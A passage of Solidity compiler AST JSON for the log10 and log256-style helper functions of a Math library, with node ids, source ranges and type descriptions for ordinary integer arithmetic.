10000"},"id":2378,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2376,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10471:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"34","id":2377,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10475:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"10471:5:10","typeDescriptions":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"}},"src":"10462:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2391,"nodeType":"IfStatement","src":"10458:96:10","trueBody":{"id":2390,"nodeType":"Block","src":"10478:76:10","statements":[{"expression":{"id":2384,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2380,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10496:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"},"id":2383,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2381,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10505:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"34","id":2382,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10509:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"10505:5:10","typeDescriptions":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 10000"}},"src":"10496:14:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2385,"nodeType":"ExpressionStatement","src":"10496:14:10"},{"expression":{"id":2388,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2386,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10528:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"34","id":2387,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10538:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"10528:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2389,"nodeType":"ExpressionStatement","src":"10528:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2396,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2392,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10571:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"},"id":2395,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2393,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10580:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"32","id":2394,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10584:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"10580:5:10","typeDescriptions":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"}},"src":"10571:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2408,"nodeType":"IfStatement","src":"10567:96:10","trueBody":{"id":2407,"nodeType":"Block","src":"10587:76:10","statements":[{"expression":{"id":2401,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2397,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10605:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"},"id":2400,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2398,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10614:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"32","id":2399,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10618:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"10614:5:10","typeDescriptions":{"typeIdentifier":"t_rational_100_by_1","typeString":"int_const 100"}},"src":"10605:14:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2402,"nodeType":"ExpressionStatement","src":"10605:14:10"},{"expression":{"id":2405,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2403,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10637:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"32","id":2404,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10647:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"10637:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2406,"nodeType":"ExpressionStatement","src":"10637:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2413,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2409,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10680:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"id":2412,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2410,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10689:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"31","id":2411,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10693:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"10689:5:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"}},"src":"10680:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2419,"nodeType":"IfStatement","src":"10676:64:10","trueBody":{"id":2418,"nodeType":"Block","src":"10696:44:10","statements":[{"expression":{"id":2416,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2414,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10714:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":2415,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10724:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"10714:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2417,"nodeType":"ExpressionStatement","src":"10714:11:10"}]}}]},{"expression":{"id":2421,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10766:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2302,"id":2422,"nodeType":"Return","src":"10759:13:10"}]},"documentation":{"id":2296,"nodeType":"StructuredDocumentation","src":"9770:114:10","text":" @dev Return the log in base 10, rounded down, of a positive value.\n Returns 0 if given 0."},"id":2424,"implemented":true,"kind":"function","modifiers":[],"name":"log10","nameLocation":"9898:5:10","nodeType":"FunctionDefinition","parameters":{"id":2299,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2298,"mutability":"mutable","name":"value","nameLocation":"9912:5:10","nodeType":"VariableDeclaration","scope":2424,"src":"9904:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2297,"name":"uint256","nodeType":"ElementaryTypeName","src":"9904:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9903:15:10"},"returnParameters":{"id":2302,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2301,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2424,"src":"9942:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2300,"name":"uint256","nodeType":"ElementaryTypeName","src":"9942:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9941:9:10"},"scope":2587,"src":"9889:890:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2459,"nodeType":"Block","src":"11014:165:10","statements":[{"id":2458,"nodeType":"UncheckedBlock","src":"11024:149:10","statements":[{"assignments":[2436],"declarations":[{"constant":false,"id":2436,"mutability":"mutable","name":"result","nameLocation":"11056:6:10","nodeType":"VariableDeclaration","scope":2458,"src":"11048:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2435,"name":"uint256","nodeType":"ElementaryTypeName","src":"11048:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2440,"initialValue":{"arguments":[{"id":2438,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2427,"src":"11071:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2437,"name":"log10","nodeType":"Identifier","overloadedDeclarations":[2424,2460],"referencedDeclaration":2424,"src":"11065:5:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":2439,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11065:12:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"11048:29:10"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2456,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2441,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2436,"src":"11098:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2451,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"id":2445,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2442,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2430,"src":"11108:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":2443,"name":"Rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1729,"src":"11120:8:10","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_Rounding_$1729_$","typeString":"type(enum Math.Rounding)"}},"id":2444,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"Up","nodeType":"MemberAccess","referencedDeclaration":1727,"src":"11120:11:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"src":"11108:23:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2450,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2448,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2446,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11135:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"id":2447,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2436,"src":"11139:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11135:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":2449,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2427,"src":"11148:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11135:18:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"11108:45:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"30","id":2453,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11160:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"id":2454,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"11108:53:10","trueExpression":{"hexValue":"31","id":2452,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11156:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"id":2455,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"11107:55:10","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"11098:64:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2434,"id":2457,"nodeType":"Return","src":"11091:71:10"}]}]},"documentation":{"id":2425,"nodeType":"StructuredDocumentation","src":"10785:143:10","text":" @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":2460,"implemented":true,"kind":"function","modifiers":[],"name":"log10","nameLocation":"10942:5:10","nodeType":"FunctionDefinition","parameters":{"id":2431,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2427,"mutability":"mutable","name":"value","nameLocation":"10956:5:10","nodeType":"VariableDeclaration","scope":2460,"src":"10948:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2426,"name":"uint256","nodeType":"ElementaryTypeName","src":"10948:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2430,"mutability":"mutable","name":"rounding","nameLocation":"10972:8:10","nodeType":"VariableDeclaration","scope":2460,"src":"10963:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"typeName":{"id":2429,"nodeType":"UserDefinedTypeName","pathNode":{"id":2428,"name":"Rounding","nodeType":"IdentifierPath","referencedDeclaration":1729,"src":"10963:8:10"},"referencedDeclaration":1729,"src":"10963:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"10947:34:10"},"returnParameters":{"id":2434,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2433,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2460,"src":"11005:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2432,"name":"uint256","nodeType":"ElementaryTypeName","src":"11005:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11004:9:10"},"scope":2587,"src":"10933:246:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2546,"nodeType":"Block","src":"11493:600:10","statements":[{"assignments":[2469],"declarations":[{"constant":false,"id":2469,"mutability":"mutable","name":"result","nameLocation":"11511:6:10","nodeType":"VariableDeclaration","scope":2546,"src":"11503:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2468,"name":"uint256","nodeType":"ElementaryTypeName","src":"11503:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2471,"initialValue":{"hexValue":"30","id":2470,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11520:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"11503:18:10"},{"id":2543,"nodeType":"UncheckedBlock","src":"11531:533:10","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2476,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2474,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2472,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11559:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"313238","id":2473,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11568:3:10","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"11559:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2475,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11574:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"11559:16:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2486,"nodeType":"IfStatement","src":"11555:98:10","trueBody":{"id":2485,"nodeType":"Block","src":"11577:76:10","statements":[{"expression":{"id":2479,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2477,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11595:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"313238","id":2478,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11605:3:10","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},"src":"11595:13:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2480,"nodeType":"ExpressionStatement","src":"11595:13:10"},{"expression":{"id":2483,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2481,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"11626:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3136","id":2482,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11636:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"11626:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2484,"nodeType":"ExpressionStatement","src":"11626:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2491,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2489,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2487,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11670:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3634","id":2488,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11679:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"11670:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2490,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11684:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"11670:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2501,"nodeType":"IfStatement","src":"11666:95:10","trueBody":{"id":2500,"nodeType":"Block","src":"11687:74:10","statements":[{"expression":{"id":2494,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2492,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11705:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3634","id":2493,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11715:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"11705:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2495,"nodeType":"ExpressionStatement","src":"11705:12:10"},{"expression":{"id":2498,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2496,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"11735:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"38","id":2497,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11745:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"11735:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2499,"nodeType":"ExpressionStatement","src":"11735:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2506,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2504,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2502,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11778:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3332","id":2503,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11787:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"11778:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2505,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11792:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"11778:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2516,"nodeType":"IfStatement","src":"11774:95:10","trueBody":{"id":2515,"nodeType":"Block","src":"11795:74:10","statements":[{"expression":{"id":2509,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2507,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11813:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"3332","id":2508,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11823:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"11813:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2510,"nodeType":"ExpressionStatement","src":"11813:12:10"},{"expression":{"id":2513,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2511,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"11843:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"34","id":2512,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11853:1:10","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"11843:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2514,"nodeType":"ExpressionStatement","src":"11843:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2521,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2519,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2517,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"11886:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"3136","id":2518,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11895:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"11886:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2520,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11900:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 